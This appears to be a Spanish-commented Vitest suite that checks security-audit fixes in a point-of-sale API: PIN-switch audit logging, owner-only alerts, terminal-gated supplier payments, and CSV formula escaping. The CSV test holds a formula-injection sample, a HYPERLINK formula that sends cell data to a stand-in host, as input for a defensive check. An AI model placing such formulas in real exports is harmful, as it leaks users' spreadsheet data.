// Arreglos de la auditoría de seguridad del 19-nov-2026 (M3, M4, B1-B8).
import { createRequire } from "node:module";
import { describe, expect, it, vi } from "vitest";

createRequire(new URL("../apps/api/package.json", import.meta.url))(
  "reflect-metadata",
);

vi.mock("../apps/api/src/security", async (original) => ({
  ...(await original<typeof import("../apps/api/src/security")>()),
  // Sin base: el PIN se compara con la función real de la ruta.
  verifyPinAttempt: async (_db: unknown, _key: string, verify: () => any) => {
    const id = await verify();
    if (!id) throw new Error("PIN incorrecto.");
    return id;
  },
}));

const BRANCH = "main";
const actor = {
  id: "11111111-1111-4111-8111-111111111111",
  name: "Cajera A",
  role: "seller",
  permissions: ["sale:write"],
  branchId: BRANCH,
  terminalId: "t1",
  ip: "10.0.0.5",
} as any;

describe("M3 · el cambio de usuario con PIN exitoso queda en la bitácora", () => {
  const target = {
    id: "22222222-2222-4222-8222-222222222222",
    name: "Cajera B",
    active: true,
    branchId: BRANCH,
    pinHash: "",
    role: { name: "seller", permissions: ["sale:write"] },
  };
  const setup = async () => {
    const { AuthController, passwordHash } = await import(
      "../apps/api/src/auth"
    );
    target.pinHash ||= await passwordHash("482913");
    const logs: any[] = [];
    const db: any = {
      user: { findFirst: async () => target },
      auditLog: { create: async (args: any) => logs.push(args.data) },
    };
    const controller = new AuthController(db, {} as any, {} as any);
    (controller as any).issue = async () => ({ accessToken: "x" });
    return { controller, logs };
  };
  it("registra pin_switch con origen, destino, equipo e IP", async () => {
    const { controller, logs } = await setup();
    await controller.pin(
      actor,
      { userId: target.id, pin: "482913" },
      {} as any,
    );
    const row = logs.find((l) => l.action === "pin_switch");
    expect(row).toMatchObject({
      userId: actor.id,
      entity: "user",
      entityId: target.id,
      terminalId: "t1",
      ip: "10.0.0.5",
      branchId: BRANCH,
    });
  });
  it("con PIN incorrecto no se registra el cambio", async () => {
    const { controller, logs } = await setup();
    await expect(
      controller.pin(actor, { userId: target.id, pin: "000000" }, {} as any),
    ).rejects.toThrow();
    expect(logs.some((l) => l.action === "pin_switch")).toBe(false);
  });
  it("se conserva como acción de seguridad (400 días)", async () => {
    const { SECURITY_AUDIT_ACTIONS } =
      await import("../apps/api/src/retention");
    expect(SECURITY_AUDIT_ACTIONS).toContain("pin_switch");
  });
});

describe("B2 · las alertas de seguridad de cuentas solo las ve la dueña", () => {
  it("login_unapproved_device y account_locked son solo de la dueña", async () => {
    const { OWNER_ONLY_ALERT_TYPES } = await import("../apps/api/src/alerts");
    expect(OWNER_ONLY_ALERT_TYPES).toEqual(
      expect.arrayContaining(["login_unapproved_device", "account_locked"]),
    );
  });
});

describe("B1 · el CSV de ingresos neutraliza fórmulas en celdas de texto", () => {
  it("antepone ' a texto que empieza con = + - @ tabulación o retorno", async () => {
    const { csvCell } = await import("../apps/api/src/income-report");
    expect(csvCell('=HYPERLINK("http://x/?d="&A2,"ver")')).toBe(
      `"'=HYPERLINK(""http://x/?d=""&A2,""ver"")"`,
    );
    expect(csvCell("+1 809")).toBe("'+1 809");
    expect(csvCell("-cmd")).toBe("'-cmd");
    expect(csvCell("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(csvCell("\tx")).toBe("'\tx");
  });
  it("los importes negativos y el texto normal no cambian", async () => {
    const { csvCell } = await import("../apps/api/src/income-report");
    expect(csvCell("-125.50")).toBe("-125.50");
    expect(csvCell("Banco Popular")).toBe("Banco Popular");
    expect(csvCell(null)).toBe("");
  });
});

describe("B3 · el pago a proveedor exige equipo aprobado", () => {
  it("POST /supplier-payments lleva @RequireTerminal", async () => {
    const { AdminController } = await import("../apps/api/src/admin");
    expect(
      Reflect.getMetadata(
        "terminal",
        AdminController.prototype.supplierPayment,
      ),
    ).toBe(true);
  });
});
